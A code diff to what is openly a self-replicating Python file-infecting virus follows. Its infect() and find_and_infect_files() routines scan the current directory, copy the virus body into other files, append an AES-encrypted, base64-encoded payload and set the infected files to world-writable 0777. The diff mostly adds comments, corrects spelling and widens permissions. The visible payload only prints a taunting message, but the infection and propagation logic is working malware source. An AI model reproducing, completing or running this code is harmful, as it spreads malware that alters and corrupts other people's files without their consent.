@@ -130,7 +130,7 @@ def infect(filename):
    # Create a new file named as previous file
    destination = open(filename, 'w')
    # Set execution permission to the file
-   os.chmod(filename, S_IEXEC)
+   os.chmod(filename, 0777)
    # Open the temporary file   
    source = open(filename + '-copy', 'r')
    # Open this file
@@ -142,31 +142,31 @@ def infect(filename):
    # Write the key
    destination.write("\n######################################################## First script python\n")
    destination.write("# coding=utf-8\n")
-   destination.write("# Start Uncrypted\n")
-   # Set the copy to False, uncrypted body not found yet
+   destination.write("# Start Unencrypted\n")
+   # Set the copy to False, unencrypted body not found yet
    copy = False
    # Initialize result
    result = ''
-   # For every line
+   # Copy the unencrypted payload into the new file only if the string '# Start Unencrypted'  is found
    for line in this:
-      if line.strip() == '# Start Uncrypted':
+      if line.strip() == '# Start Unencrypted':
          copy = True
-      elif line.strip() == '# End Uncrypted':
-         destination.write('# End Uncrypted')
+      elif line.strip() == '# End Unencrypted':
+         destination.write('# End Unencrypted')
          copy = False
       elif copy:
          destination.write(line);
-
+   # Write the malicious payload at the of file
    destination.write("\n# Start payload\n")
    destination.write("#")
    destination.write(str(encrypt(e, filename)))
    destination.write("\n# End payload")
-
+   # Remove the temporary copy of the file
    os.remove(filename + '-copy')
    source.close()
    destination.close()
    this.close()
- 
+# Function to find and infect files in the current directory 
 def find_and_infect_files():
    path = '.'
    # Lists all files inside current directory
@@ -179,18 +179,21 @@ def find_and_infect_files():
          print "Infected " +  str(filename)
          # Infect file with the virus
          infect(filename)
-
+# Function to encrypt 
 def encrypt(data,filename):
    source = open(filename + '-copy', 'r')
-
+   # Generate a new random initialization vector
    iv = Random.new().read(AES.block_size)
+   # Read first 24 bytes to create the key to encrypt data
    cipher = AES.new(StringIO.StringIO(source).read(24), AES.MODE_CFB, iv)
+   # Encrypt data
    encrypted = iv + cipher.encrypt(data)
 
    source.close()
+   # Encode encrypted data in base64
    return base64.b64encode(encrypted)
  ####################
-
+# Malicious payload to execute
 def payload():
    print "This file is infected infected! Mhuahauhauahau!"
 
